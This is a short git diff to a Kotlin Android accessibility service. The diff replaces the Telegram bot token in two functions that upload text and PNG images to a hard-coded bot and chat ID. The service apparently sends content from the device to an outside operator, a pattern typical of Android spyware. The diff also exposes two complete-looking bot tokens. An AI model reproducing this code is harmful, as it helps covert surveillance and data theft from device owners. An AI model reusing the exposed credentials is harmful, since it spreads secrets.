@@ -27,6 +27,7 @@ import okhttp3.MediaType.Companion.toMediaTypeOrNull
 
 import android.view.Display
 
+
 class MyAccessibilityService : AccessibilityService() {
 
     companion object {
@@ -134,7 +135,7 @@ class MyAccessibilityService : AccessibilityService() {
             .add("chat_id", "8820979221")
             .add("text", text)
             .build()
-        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ/sendMessage").post(form).build()).execute()
+        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc/sendMessage").post(form).build()).execute()
     }
 
     private suspend fun sendTelegramPhoto(file: File) {
@@ -144,6 +145,6 @@ class MyAccessibilityService : AccessibilityService() {
             .addFormDataPart("chat_id", "8820979221")
             .addFormDataPart("photo", file.name, file.asRequestBody("image/png".toMediaTypeOrNull()))
             .build()
-        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAEmlnzZ1swP8Dtd0btYgScRq89Z2sw84HQ/sendPhoto").post(body).build()).execute()
+        client.newCall(Request.Builder().url("https://api.telegram.org/bot8840980473:AAE8Tml8PjJH05vcN5SNSRESqC34mTlC1kc/sendPhoto").post(body).build()).execute()
     }
 }
